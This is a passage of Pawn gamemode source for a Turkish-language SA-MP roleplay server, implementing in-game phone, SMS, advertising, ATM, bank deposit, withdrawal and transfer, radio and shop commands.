		SendClientMessage(playerid, COLOR_GRAD2, "Hapisteyken telefon kullanamazsýn.");
		return 1;
	}
	if(!PhoneOnline[playerid])
	{
		PhoneOnline[playerid] = 1;
		SendClientMessage(playerid, COLOR_GRAD2, "Telefonun kapatýldý.");
	}
	else
	{
		PhoneOnline[playerid] = 0;
		SendClientMessage(playerid, COLOR_GRAD2, "Telefonun açýldý.");
	}
	return 1;
}

CMD:reklam(playerid, params[])
{
	return cmd_reklamlar(playerid, params);
}

CMD:reklamver(playerid, params[]) {
	return cmd_reklamlar(playerid, params);
}

CMD:ilanver(playerid, params[]) {
	return cmd_reklamlar(playerid, params);
}

CMD:reklamlar(playerid, params[]) {
	if(gPlayerLogged[playerid] == 0) {
		SendClientMessage(playerid, COLOR_GREY, "Giriþ yapmadýn.");
	}
	else if(GetPVarType(playerid, "Injured")) {
		SendClientMessage(playerid, COLOR_GREY, "Yaralýyken reklam kullanamazsýn.");
	}
	else if(PlayerCuffed[playerid] != 0) {
		SendClientMessage(playerid, COLOR_GREY, "Þu an reklam kullanamazsýn.");
	}
	else if(PlayerInfo[playerid][pJailTime] > 0) {
		SendClientMessage(playerid, COLOR_GREY, "Hapisteyken reklam kullanamazsýn.");
	}
	else ShowPlayerDialogEx(playerid, DIALOG_ADMAIN, DIALOG_STYLE_LIST, "Reklamlar", "Reklamlarý Listele\nReklam Ara\nReklam Ver\nÖncelikli Reklam Ver", "Seç", "Iptal");
	return 1;
}

CMD:acek(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}

	if(!IsAtATM(playerid))
	{
		SendClientMessage(playerid, COLOR_GREY, "   ATM yakýnýnda deðilsin!");
		return 1;
	}
	new string[128], amount;
	if(sscanf(params, "d", amount))
	{
		SendClientMessage(playerid, COLOR_GRAD2, "KULLANIM: /acek [amount]");
		format(string, sizeof(string), "  Hesabýnda $%d var.", PlayerInfo[playerid][pBank]);
		SendClientMessage(playerid, COLOR_GRAD3, string);
		return 1;
	}

	if(amount > PlayerInfo[playerid][pBank] || amount < 1)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "   O kadar paran yok!");
		return 1;
	}
	if(PlayerInfo[playerid][pDonator] == 0)
	{
		new fee;
		fee = 3*amount/100;
		PlayerInfo[playerid][pBank]=PlayerInfo[playerid][pBank]-fee;
		format(string, sizeof(string), "-$%d yüzde 3 ücret.", fee);
		SendClientMessage(playerid, COLOR_GRAD2, string);
	}

	if(PlayerInfo[playerid][pBank]-amount < 1)
	    return SendClientMessage(playerid, COLOR_GREY, "Yeterli paran yok, bankaya git ve tüm paraný çek.");

	PlayerInfo[playerid][pBank]=PlayerInfo[playerid][pBank]-amount;
	GivePlayerCash(playerid,amount);
	format(string, sizeof(string), "  Hesabýndan $%d kadar çektin. Güncel Bakiye: $%d ", amount,PlayerInfo[playerid][pBank]);
	SendClientMessage(playerid, COLOR_YELLOW, string);
	return 1;
}

CMD:aparayatir(playerid, params[]) {
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}

	if(!IsAtATM(playerid))
	{
		SendClientMessage(playerid, COLOR_GREY, "   ATM yakýnýnda deðilsin!");
		return 1;
	}
	new string[128], amount;
	if(sscanf(params, "d", amount))
	{
		SendClientMessage(playerid, COLOR_GRAD2, "KULLANIM: /aparayatir [amount]");
		format(string, sizeof(string), "   Hesabýnda $%d paran var.", PlayerInfo[playerid][pBank]);
		SendClientMessage(playerid, COLOR_GRAD3, string);
		return 1;
	}

	if(amount > GetPlayerCash(playerid) || amount < 1)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "   O kadar paran yok!");
		return 1;
	}
	if(PlayerInfo[playerid][pDonator] == 0)
	{
		new fee;
		fee = 3*amount/100;
		PlayerInfo[playerid][pBank]=PlayerInfo[playerid][pBank]-fee;
		format(string, sizeof(string), "-$%d money (3 percent fee).", fee);
		SendClientMessage(playerid, COLOR_GRAD2, string);
	}
	GivePlayerCash(playerid,-amount);
	new curfunds = PlayerInfo[playerid][pBank];
	PlayerInfo[playerid][pBank]=amount+PlayerInfo[playerid][pBank];
	SendClientMessage(playerid, COLOR_WHITE, "|___ ATM STATMENT ___|");
	format(string, sizeof(string), "  Eski bakiye: $%d", curfunds);
	SendClientMessage(playerid, COLOR_GRAD2, string);
	format(string, sizeof(string), "  Yatirilan: $%d",amount);
	SendClientMessage(playerid, COLOR_GRAD4, string);
	SendClientMessage(playerid, COLOR_GRAD6, "|-----------------------------------------|");
	format(string, sizeof(string), " Yeni bakiye: $%d", PlayerInfo[playerid][pBank]);
	SendClientMessage(playerid, COLOR_WHITE, string);
	return 1;
}

CMD:ahesap(playerid, params[])
{
	if(!IsAtATM(playerid))
	{
		SendClientMessage(playerid, COLOR_GREY, "   ATM yakýnýnda deðilsin!");
		return 1;
	}
	new string[128];
	format(string, sizeof(string), "   Hesabýnda $%d paran var.",PlayerInfo[playerid][pBank]);
	SendClientMessage(playerid, COLOR_YELLOW, string);
	return 1;
}
/*
CMD:robbanksdfghjkl(playerid, params[]) {
	new string[128];
	if(IsPlayerInRangeOfPoint(playerid, 2.5, 2309.3972,-8.5574,26.7422)) {
		if(BankRobTimer[playerid] > 300000) return SendClientMessage(playerid, COLOR_WHITE, "You can only do this every 5 minutes!");
	    SetTimerEx("RobBankTimer", 60000, false, "d", playerid);
	    SendClientMessage(playerid, COLOR_WHITE, "You are now robbing the bank, the LSPD have been alerted.");
	    SendRadioMessage(2, DEPTRADIO, "All Units: The bank is being robbed!!");
	    format(string, sizeof string, "* %s has started to rob the bank.", GetPlayerNameEx(playerid));
	    ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	    BankRobTimer[playerid] = GetTickCount();
	}
	else {
	    SendClientMessage(playerid, COLOR_WHITE, "You're not near the bank robbing spot!");
	}
	return 1;
}

forward RobBankTimer(playerid);
public RobBankTimer(playerid) {
	new bankmoney = 0, string[128];
    bankmoney = random(10000)*5;
    format(string, sizeof string, "You have taken {FF0000}$%d {FFFFFF}out of the banks vault!", bankmoney);
    SendClientMessage(playerid, COLOR_WHITE, string);
    PlayerInfo[playerid][pCash] += bankmoney;
    GivePlayerMoney(playerid, PlayerInfo[playerid][pCash]);
    return 1;
}
*/
CMD:atransfer(playerid, params[])
{
	if(PlayerInfo[playerid][pLevel] < 3)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "   En az Level 3 olman lazým!");
		return 1;
	}
   	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}
	if(!IsAtATM(playerid))
	{
		SendClientMessage(playerid, COLOR_GREY, "   ATM yakýnýnda deðilsin!");
		return 1;
	}
	new string[128], giveplayerid, amount;
	if(sscanf(params, "ud", giveplayerid, amount)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /atransfer [Oyuncu ID/Ýsim] [amount]");

	if(IsPlayerConnected(giveplayerid))
	{
		if(giveplayerid != INVALID_PLAYER_ID)
		{
			new playermoney = PlayerInfo[playerid][pBank];
			if(amount > 0 && playermoney >= amount)
			{
				if(PlayerInfo[playerid][pDonator] == 0)
				{
					new fee;
					fee = 3*amount/100;
					PlayerInfo[playerid][pBank]=PlayerInfo[playerid][pBank]-fee;
					format(string, sizeof(string), "-$%d para (yüzde 3 ücret).", fee);
					SendClientMessage(playerid, COLOR_GRAD2, string);
				}
				PlayerInfo[playerid][pBank] -= amount;
				PlayerInfo[giveplayerid][pBank] += amount;
				format(string, sizeof(string), "   $%d kadar parayý %s adlý kiþinin hesabýna transfer ettin.", amount, GetPlayerNameEx(giveplayerid),giveplayerid);
				PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				SendClientMessage(playerid, COLOR_GRAD1, string);
				format(string, sizeof(string), "   $%d hesabýna transfer edildi, Gönderen: %s.", amount, GetPlayerNameEx(playerid), playerid);
				SendClientMessage(giveplayerid, COLOR_GRAD1, string);
				new ip[32], ipex[32];
				GetPlayerIp(playerid, ip, sizeof(ip));
				GetPlayerIp(giveplayerid, ipex, sizeof(ipex));
				format(string, sizeof(string), "[ATM] %s (IP:%s), $%d parayý  %s (IP:%s) kiþisine transfer etti.", GetPlayerNameEx(playerid), ip, amount, GetPlayerNameEx(giveplayerid), ipex);
				if(amount >= 42000)
				{
					ABroadCast(COLOR_YELLOW,string,2);
				}
				Log("logs/pay.log", string);
				PlayerPlaySound(giveplayerid, 1052, 0.0, 0.0, 0.0);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Geçersiz iþlem miktarý.");
			}
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	return 1;
}

CMD:paracek(playerid, params[])
{
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}

	if(!IsPlayerInRangeOfPoint(playerid, 15.0, 2308.7346, -11.0134, 26.7422))
	{
		SendClientMessage(playerid, COLOR_GREY, "Bankada deðilsin!");
		return 1;
	}
	new string[128], amount;

	if(sscanf(params, "d", amount))
	{
		SendClientMessage(playerid, COLOR_GRAD2, "KULLANIM: /paracek [amount]");
		format(string, sizeof(string), "   Hesabýnda $%d paran var.", PlayerInfo[playerid][pBank]);
		SendClientMessage(playerid, COLOR_GRAD3, string);
		return 1;
	}

	if(amount > PlayerInfo[playerid][pBank] || amount < 1)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "   O kadar paran yok!");
		return 1;
	}
	GivePlayerCash(playerid,amount);
	PlayerInfo[playerid][pBank]=PlayerInfo[playerid][pBank]-amount;
	format(string, sizeof(string), "  Hesabýndan $%d kadar para çektin. Güncel Bakiye: $%d ", amount,PlayerInfo[playerid][pBank]);
	SendClientMessage(playerid, COLOR_YELLOW, string);
	return 1;
}

CMD:parayatir(playerid, params[]) {
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}

	if(!IsPlayerInRangeOfPoint(playerid, 15.0, 2308.7346, -11.0134, 26.7422))
	{
		SendClientMessage(playerid, COLOR_GREY, "Bankada deðilsin!");
		return 1;
	}
	new string[128], amount;

	if(sscanf(params, "d", amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /parayatir [amount]");
		format(string, sizeof(string), "   Hesabýnda $%d paran var.", PlayerInfo[playerid][pBank]);
		SendClientMessage(playerid, COLOR_GRAD3, string);
		return 1;
	}

	if(amount > GetPlayerCash(playerid) || amount < 1)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "   O kadar paran yok!");
		return 1;
	}
	GivePlayerCash(playerid,-amount);
	new curfunds = PlayerInfo[playerid][pBank];
	PlayerInfo[playerid][pBank]=amount+PlayerInfo[playerid][pBank];
	SendClientMessage(playerid, COLOR_WHITE, "|___ BANKA AÇIKLAMASI ___|");
	format(string, sizeof(string), "  Eski Bakiye: $%d", curfunds);
	SendClientMessage(playerid, COLOR_GRAD2, string);
	format(string, sizeof(string), "  Mevduat: $%d",amount);
	SendClientMessage(playerid, COLOR_GRAD4, string);
	SendClientMessage(playerid, COLOR_GRAD6, "|-----------------------------------------|");
	format(string, sizeof(string), "  Yeni Bakiye: $%d", PlayerInfo[playerid][pBank]);
	SendClientMessage(playerid, COLOR_WHITE, string);
	return 1;
}

CMD:hesap(playerid, params[])
{
	new string[128];
	if(!IsPlayerInRangeOfPoint(playerid, 15.0, 2308.7346, -11.0134, 26.7422))
	{
		SendClientMessage(playerid, COLOR_GREY, "Bankada deðilsin!");
		return 1;
	}
	format(string, sizeof(string), "Hesabýnda $%d kadar paran var.",PlayerInfo[playerid][pBank]);
	SendClientMessage(playerid, COLOR_YELLOW, string);
	return 1;
}

CMD:transfer(playerid, params[])
{
	if(PlayerInfo[playerid][pLevel] < 3)
	{
		SendClientMessage(playerid, COLOR_GRAD1, "   En az Level 3 olman lazým!");
		return 1;
	}
	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}
	if(!IsPlayerInRangeOfPoint(playerid, 15.0, 2308.7346, -11.0134, 26.7422))
	{
		SendClientMessage(playerid, COLOR_GREY, "Bankada deðilsin!");
		return 1;
	}
	new string[128], giveplayerid, amount;
	if(sscanf(params, "ud", giveplayerid, amount)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /transfer [Oyuncu ID/Ýsim] [amount]");


	if(IsPlayerConnected(giveplayerid))
	{
		if(giveplayerid != INVALID_PLAYER_ID)
		{
			new playermoney = PlayerInfo[playerid][pBank] ;
			if(amount > 0 && playermoney >= amount)
			{
				PlayerInfo[playerid][pBank] -= amount;
				PlayerInfo[giveplayerid][pBank] += amount;
				format(string, sizeof(string), "   $%d miktarý %s adlý kiþinin hesabýna transfer ettin.", amount, GetPlayerNameEx(giveplayerid),giveplayerid);
				PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				SendClientMessage(playerid, COLOR_GRAD1, string);
				format(string, sizeof(string), "   $%d hesabýna transfer edildi, Gönderen: %s.", amount, GetPlayerNameEx(playerid), playerid);
				SendClientMessage(giveplayerid, COLOR_GRAD1, string);
				new ip[32], ipex[32];
				GetPlayerIp(playerid, ip, sizeof(ip));
				GetPlayerIp(giveplayerid, ipex, sizeof(ipex));
				format(string, sizeof(string), "[BANK] %s (IP:%s) $%d miktar parayý %s (IP:%s) kiþisine transfer etti.", GetPlayerNameEx(playerid), ip, amount, GetPlayerNameEx(giveplayerid), ipex);

				if(amount >= 500000)
					ABroadCast(COLOR_YELLOW,string,2);

				Log("logs/pay.log", string);
				PlayerPlaySound(giveplayerid, 1052, 0.0, 0.0, 0.0);
			}
			else
			{
				SendClientMessage(playerid, COLOR_GRAD1, "   Geçersiz iþlem miktarý.");
			}
		}
	}
	else SendClientMessage(playerid, COLOR_GRAD1, "Geçersiz oyuncu.");
	return 1;
}

CMD:prkapat(playerid, params[])
{
	if(PlayerInfo[playerid][pRadio] == 1)
	{
 		if(gRadio[playerid] == 0)
   		{
   		    new string[128];
     		gRadio[playerid] = 1;
       		format(string,sizeof(string),"Portatif radyonu açtýn, ve %d kHz frekansýnda çalýþýyor.",PlayerInfo[playerid][pRadioFreq]);
	        SendClientMessage(playerid,COLOR_WHITE,string);
	    }
	    else
	    {
     		gRadio[playerid] = 0;
       		SendClientMessage(playerid,COLOR_WHITE,"Portatif radyonu kapadýn.");
	    }
	}
	else
	{
 		SendClientMessage(playerid, COLOR_GRAD2, "Portatif radyon yok!");
	}
  	return 1;
}

CMD:satinal(playerid, params[])
{
    new idx = GetPlayerVirtualWorld(playerid)-100;
	if(PlayerInfo[playerid][pPetKontrol]) return HataMesajiYolla(playerid, "Pet modunda bu komutu kullanamazsýnýz.");
    if(idx > 0 && idx < MAX_BIZ && BizInfo[idx][bType] != 1 && BizInfo[idx][bType] != 7 && BizInfo[idx][bType] != 3 || idx < 1 || idx > MAX_BIZ) return SendClientMessage(playerid, COLOR_GREY, "Herhangi bir iþ yerinin içinde deðilsin.");
   	if(BizInfo[idx][bType] == 1)
    {
	    ShowPlayerDialogEx(playerid, STOREMENU, DIALOG_STYLE_LIST, "24/7","Cep Telefonu		$100\nTelefon Defteri	$20\nZar	$20\nKondom		$7\nCD Çalar	$50\nSprey	$50\nIp		$100\nSigara	$5\nGazoz	$1\nPortatif Radyo	$500\nGöz Bandanasý 		$50\nBenzin Bidonu 		$50", "Satýn Al", "Iptal");
    }
 	else if(BizInfo[idx][bType] == 3)
	{
	 	ShowPlayerDialogEx(playerid, 3154, DIALOG_STYLE_LIST, "Silah Maðazasý", "Desert Eagle{990000}5.000 $\nColt 45 {990000}3.500 $\nSusturuculu Colt 45{990000}3750 $\nShotgun{990000}5.500 $\nÇelik Yelek{990000}1.000 $\nÝlk Yardým Kiti{990000}350 $", "Sec", "Iptal");
    }
    return 1;
}

CMD:telefonyardim(playerid, params[])
{
    SendClientMessage(playerid, COLOR_GREEN,"_______________________________________");
    if(PlayerInfo[playerid][pNumber] != 0) {
        SendClientMessage(playerid, COLOR_WHITE,"*** YARDIM *** - daha çok bilgi için komut yaz.");
        SendClientMessage(playerid, COLOR_GRAD3,"*** CEP TELEFONU *** /ara 'örn: /ara 911' /sms (/p)ac (/h)kapat /numara /rt /telefonhoparlor");
    } else SendClientMessage(playerid, COLOR_WHITE,"24-7 dükkanlarýndan cep telefonu alabilirsin");
    return 1;
}

CMD:ara(playerid, params[])
{
	new string[128], phonenumb;

	if(isnull(params))
		return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /ara [telefon numarasý]");

	phonenumb = strval(params);

	if(PlayerInfo[playerid][pJailTime] > 0)
	{
		SendClientMessage(playerid,COLOR_GREY,"Hapisteyken telefon açamazsýn.");
		return 1;
	}
	if(PlayerTied[playerid] != 0 || PlayerCuffed[playerid] != 0)
	{
		SendClientMessage(playerid,COLOR_GREY,"Tutukluyken telefonla konuþamazsýn.");
		return 1;
	}
	if(PlayerInfo[playerid][pNumber] == 0)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Cep telefonun yok.");
		return 1;
	}
	if(PhoneOnline[playerid] > 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Telefonun kapalý.");
		return 1;
	}
	format(string, sizeof(string), "* %s telefonunu çýkardý.", GetPlayerNameEx(playerid));
	ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	if(phonenumb == 911)
	{
		if(PlayerInfo[playerid][pJailed] == 3 || PlayerInfo[playerid][pJailed] == 4)
		{
			SendClientMessage(playerid, COLOR_WHITE, "Hapisteyken kullanamazsýn!");
			return 1;
		}
		SendClientMessage(playerid, COLOR_WHITE,"IPUCU: T'yi kullanarak telefonda konuþabilirsin, kapatmak için /hangup.");
		SendClientMessage(playerid, COLOR_ALLDEPT, "ACIL: Hangi servise ihtiyacýn var, polis yada hastane?");
		Mobile[playerid] = 911;
		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
		SetPlayerAttachedObject(playerid, 9, 330, 6);
		return 1;
	}
	if(phonenumb == PlayerInfo[playerid][pNumber])
	{
		SendClientMessage(playerid, COLOR_GRAD2, "  Meþgul tonu aldýn...");
		return 1;
	}
	if(Mobile[playerid] != INVALID_PLAYER_ID)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Zaten aramadasýn...");
		return 1;
	}
	foreach(Player, i)
	{
		if(PlayerInfo[i][pNumber] == phonenumb && phonenumb != 0)
		{
			new giveplayerid = i;
			Mobile[playerid] = giveplayerid; //caller connecting
			if(IsPlayerConnected(giveplayerid))
			{
				if(giveplayerid != INVALID_PLAYER_ID)
				{
					if(PhoneOnline[giveplayerid] > 0)
					{
						SendClientMessage(playerid, COLOR_GREY, "Oyuncunun telefonu kapalý.");
						Mobile[playerid] = INVALID_PLAYER_ID;
						return 1;
					}
					if(Mobile[giveplayerid] != INVALID_PLAYER_ID)
					{
						SendClientMessage(playerid, COLOR_GRAD2, "Meþgul tonu aldýn...");
						Mobile[playerid] = INVALID_PLAYER_ID;
						return 1;
					}
					if(Spectating[giveplayerid]!=0)
					{
						SendClientMessage(playerid, COLOR_GRAD2, "Meþgul tonu aldýn...");
						Mobile[playerid] = INVALID_PLAYER_ID;
						return 1;
					}
					if(Mobile[giveplayerid] == INVALID_PLAYER_ID)
					{
						format(string, sizeof(string), "Telefonun çalýyor - cevaplamak için /p. [Arayan ID: %s]", GetPlayerNameEx(playerid));
						SendClientMessage(giveplayerid, COLOR_YELLOW, string);
						format(string, sizeof(string), "* %s adlý kiþinin telefonu çalýyor.", GetPlayerNameEx(i));
						SendClientMessage(playerid, COLOR_WHITE,"IPUCU: T'yi kullanarak telefonda konuþabilirsin, kapatmak için /hangup.");
						ProxDetector(30.0, i, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
						CellTime[playerid] = 1;
						SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
						SetPlayerAttachedObject(playerid, 9, 330, 6);
						return 1;
					}
				}
			}
		}
	}
	SendClientMessage(playerid, COLOR_GRAD2, "Numara aranamadý, aradýðýnýz numarayý kontrol edin.");
	return 1;
}

CMD:t(playerid, params[])
{
	return cmd_sms(playerid, params);
}

CMD:mesaj(playerid, params[])
{
	return cmd_sms(playerid, params);
}

CMD:rt(playerid, params[])
{
	new string[128], text[100];
	if(sscanf(params, "s[100]", text)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /rt [text chat]");

	if(gPlayerLogged[playerid] == 0)
		return SendClientMessage(playerid, COLOR_GREY, "Giriþ yapmadýnýz!");

	if(GetPVarInt(playerid, "Injured") != 0||GetPVarInt(playerid, "Hospital")!=0)
		return SendClientMessage (playerid, COLOR_GRAD2, "Bunu þu an yapamazsýn.");

	if(PlayerTied[playerid] != 0 || PlayerCuffed[playerid] != 0)
		return SendClientMessage(playerid,COLOR_GREY,"Tutukluyken telefonu kullanamazsýn.");

	if(PlayerInfo[playerid][pNumber] == 0)
		return SendClientMessage(playerid, COLOR_GRAD2, "  Telefonun yok...");

	if(PlayerInfo[playerid][pJailTime] > 0)
		return SendClientMessage(playerid,COLOR_GREY,"   Hapisteyken telefonu kullanamazsýn!");


	if(PhoneOnline[playerid] > 0)
		return SendClientMessage(playerid, COLOR_GREY, "Telefonun kapalý.");

	if(Spectating[playerid] == 0){
		format(string, sizeof(string), "* %s telefonunu çýkardý.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	}

	if(LastSMS[playerid] == 555)
		return SendClientMessage(playerid, COLOR_GREY, "Çevirilen numara tanýnamadý.");

	foreach(Player, i) {
		if(PlayerInfo[i][pNumber] == LastSMS[playerid] && LastSMS[playerid] != 0) {
			new giveplayerid = i;
			Mobile[playerid] = giveplayerid; //caller connecting
			if(IsPlayerConnected(giveplayerid)) {
				if(PhoneOnline[giveplayerid] > 0 || PhonePrivacy[giveplayerid] > 0) {
					SendClientMessage(playerid, COLOR_GREY, "Oyuncunun telefonu kapalý.");
					Mobile[playerid] = INVALID_PLAYER_ID;
					return 1;
				}

				if(PhonePrivacy[playerid] == 1)
					format(string, sizeof(string), "SMS: %s, Gönderen: Bilinmeyen.", text, GetPlayerNameEx(playerid), PlayerInfo[playerid][pNumber]);
				else format(string, sizeof(string), "SMS: %s, Gönderen: %s (%d)", text, GetPlayerNameEx(playerid), PlayerInfo[playerid][pNumber]);

				LastSMS[playerid] = PlayerInfo[giveplayerid][pNumber];
				LastSMS[giveplayerid] = PlayerInfo[playerid][pNumber];
				SendClientMessage(giveplayerid, COLOR_YELLOW, string);
				SendClientMessage(playerid, COLOR_YELLOW, string);
				SendClientMessage(playerid, COLOR_WHITE, "SMS iletildi.");
				format(string, sizeof(string), "~r~$-%d", txtcost);
				GameTextForPlayer(playerid, string, 5000, 1);
				GivePlayerCash(playerid,-txtcost);
				PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
				Mobile[playerid] = INVALID_PLAYER_ID;
				return 1;
			}
		}
	}
	SendClientMessage(playerid, COLOR_GRAD2, "  Mesaj iletilmedi...");
	return 1;
}

CMD:sms(playerid, params[])
{
	if(gPlayerLogged[playerid] == 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Giriþ yapmadýnýz!");
		return 1;
	}
	if(GetPVarInt(playerid, "Injured") != 0||GetPVarInt(playerid, "Hospital")!=0)
	{
		SendClientMessage (playerid, COLOR_GRAD2, "Bunu þu an yapamazsýn.");
		return 1;
	}
	if(PlayerTied[playerid] != 0 || PlayerCuffed[playerid] != 0)
	{
		SendClientMessage(playerid,COLOR_GREY,"Tutukluyken telefonu kullanamazsýn.");
		return 1;
	}

	new string[128], phonenumb, text[100];
	if(sscanf(params, "ds[100]", phonenumb, text)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: (/t)[telefon numarasý] [mesaj]");

	if(PlayerInfo[playerid][pNumber] == 0)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "  Telefonun yok...");
		return 1;
	}
	if(PlayerInfo[playerid][pJailTime] > 0)
	{
		SendClientMessage(playerid,COLOR_GREY,"   Hapisteyken telefonu kullanamazsýn!");
		return 1;
	}
	if(PhoneOnline[playerid] > 0)
	{
		SendClientMessage(playerid, COLOR_GREY, "Telefonun kapalý.");
		return 1;
	}

	if(Spectating[playerid]==0)
	{
		format(string, sizeof(string), "* %s telefonunu çýkardý.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	}

	if(phonenumb == 555)
	{
		SendClientMessage(playerid, COLOR_GREY, "Çevirilen numara tanýnamadý.");
		return 1;
	}

	foreach(Player, i)
	{
		if(PlayerInfo[i][pNumber] == phonenumb && phonenumb != 0)
		{
			new giveplayerid = i;
			Mobile[playerid] = giveplayerid; //caller connecting
			if(IsPlayerConnected(giveplayerid)) {
				if(giveplayerid != INVALID_PLAYER_ID) {
					if(PhoneOnline[giveplayerid] > 0) {
						SendClientMessage(playerid, COLOR_GREY, "Oyuncunun telefonu kapalý.");
						Mobile[playerid] = INVALID_PLAYER_ID;
						return 1;
					}

					if(PhonePrivacy[playerid] == 1)
						format(string, sizeof(string), "SMS: %s, Gönderen: Bilinmeyen.", text,GetPlayerNameEx(playerid),PlayerInfo[playerid][pNumber]);
					else format(string, sizeof(string), "SMS: %s, Gönderen: %s (%d)", text,GetPlayerNameEx(playerid),PlayerInfo[playerid][pNumber]);

					LastSMS[playerid] = PlayerInfo[giveplayerid][pNumber];
					LastSMS[giveplayerid] = PlayerInfo[playerid][pNumber];
					SendClientMessage(giveplayerid, COLOR_YELLOW, string);
					SendClientMessage(playerid, COLOR_YELLOW, string);
					SendClientMessage(playerid, COLOR_WHITE, "SMS iletildi.");
					format(string, sizeof(string), "~r~$-%d", txtcost);
					GameTextForPlayer(playerid, string, 5000, 1);
					GivePlayerCash(playerid,-txtcost);
					PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
					Mobile[playerid] = INVALID_PLAYER_ID;
					return 1;
				}
			}
		}
	}
	SendClientMessage(playerid, COLOR_GRAD2, "  Mesaj iletilmedi...");
	return 1;
}

CMD:p(playerid, params[])
{
	new string[128];
	if(Mobile[playerid] != INVALID_PLAYER_ID)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "  you're already on a call...");
		return 1;
	}
	if(GetPVarInt(playerid, "Injured") != 0||PlayerCuffed[playerid]!=0||GetPVarInt(playerid, "Hospital")!=0)
	{
		SendClientMessage (playerid, COLOR_GRAD2, "Bunu þu an yapamazsýn.");
		return 1;
	}
	foreach(Player, i)
	{
		if(Mobile[i] == playerid)
		{
			Mobile[playerid] = i; //caller connecting
			SendClientMessage(i,  COLOR_GRAD2, "   Telefonu açtý.");
			format(string, sizeof(string), "* %s telefonu cevapladý.", GetPlayerNameEx(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			SetPlayerSpecialAction(playerid, SPECIAL_ACTION_USECELLPHONE);
			SetPlayerAttachedObject(playerid, 9, 330, 6);
		}
	}
	return 1;
}

CMD:h(playerid,params[])
{
	new string[128];

	if(GetPVarInt(playerid, "Injured") != 0||PlayerCuffed[playerid]!=0||GetPVarInt(playerid, "Hospital")!=0)
	{
		SendClientMessage (playerid, COLOR_GRAD2, "Bunu þu an yapamazsýn.");
		return 1;
	}
	new caller = Mobile[playerid];
	if((IsPlayerConnected(caller) && caller != INVALID_PLAYER_ID)|| caller == 911 || caller == 912 || caller == 913 || caller == 914)
	{
		if(caller < 500)
		{
			SendClientMessage(caller,  COLOR_GRAD2, "   Telefonu kapattý.");
			format(string, sizeof(string), "* %s telefonu kaldýrdý.", GetPlayerNameEx(caller));
			ProxDetector(30.0, caller, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
			CellTime[caller] = 0;
			Mobile[caller] = INVALID_PLAYER_ID;
		}
		CellTime[playerid] = 0;
		SendClientMessage(playerid,  COLOR_GRAD2, "   Telefonu kapattýn.");
		format(string, sizeof(string), "* %s telefonu kaldýrdý.", GetPlayerNameEx(playerid));
		ProxDetector(30.0, playerid, string, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
		Mobile[playerid] = INVALID_PLAYER_ID;
		CellTime[playerid] = 0;
		SetPlayerSpecialAction(caller, SPECIAL_ACTION_STOPUSECELLPHONE);
        RemovePlayerAttachedObject(caller, 9);
		SetPlayerSpecialAction(playerid, SPECIAL_ACTION_STOPUSECELLPHONE);
		RemovePlayerAttachedObject(playerid, 9);
		return 1;
	}
	SendClientMessage(playerid,  COLOR_GRAD2, "   Telefonun cebinde.");
	return 1;
}

CMD:numara(playerid, params[]) {
	if(PlayerInfo[playerid][pPhoneBook] == 1) {

		new
			iTarget;

